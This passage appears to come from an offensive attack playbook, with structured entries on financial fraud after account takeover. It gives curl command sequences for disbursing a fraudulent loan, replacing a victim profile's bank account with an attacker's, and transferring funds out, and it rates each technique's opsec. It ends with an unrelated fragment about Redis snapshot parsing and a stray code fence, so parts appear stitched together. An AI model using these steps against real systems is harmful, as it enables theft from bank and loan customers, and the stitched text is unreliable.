    "purpose": "Business Loan"
  }'

# Response: { "loan_id": "<LOAN_ID>", "status": "approved", "amount": 999999 }

# Step 3: Query loan status
curl -s "http://target/api/loans/<LOAN_ID>/status" -b cookies.txt

# Step 4: Trigger transfer (if automated or via additional endpoint)
curl -X POST "http://target/api/loans/<LOAN_ID>/disburse" -b cookies.txt

# Result: $999,999 transferred to attacker bank account registered on the hijacked profile
```

### Unrestricted Fund Transfer via API (No Verification Workflow) [added: 2026-05]
- **Tags:** #BOLA #FinancialFraud #MoneyTransfer #BankTransfer #UnrestrictedResource #AccountTakeover
- **Trigger:** Authenticated session on hijacked account; transfer endpoint accepts arbitrary destination account without secondary verification
- **Prereq:** Valid authenticated session; ability to register or update destination bank account on profile
- **Yields:** Direct fund transfers to attacker-controlled bank account
- **Opsec:** High (audit trail, bank records)
- **Context:** Transfer endpoints that lack 2FA confirmation, approval workflows, or daily limits allow full fund extraction after account takeover. Update the registered destination account first if needed, then initiate transfer.
- **Payload/Method:**
```bash
# Step 1: Update registered bank account on hijacked profile (if needed)
curl -X POST "http://target/api/account/bank" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "account_number": "<ATTACKER_ACCOUNT_NUMBER>",
    "bank_code": "<ROUTING_NUMBER>",
    "account_type": "checking"
  }'

# Step 2: Initiate transfer
curl -X POST "http://target/api/transfers" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "from_account": "<VICTIM_ACCOUNT>",
    "amount": 50000,
    "destination": "<ATTACKER_ACCOUNT_NUMBER>"
  }'

# Response: { "transfer_id": "<TXN_ID>", "status": "completed", "amount": 50000 }

# Step 3: Verify transfer
curl -s "http://target/api/transfers/<TXN_ID>" -b cookies.txt
```

# Alternative: Use redis-rdb-tools to parse RDB snapshots if available
# dump.rdb is typically located at /var/lib/redis/ on the target
```
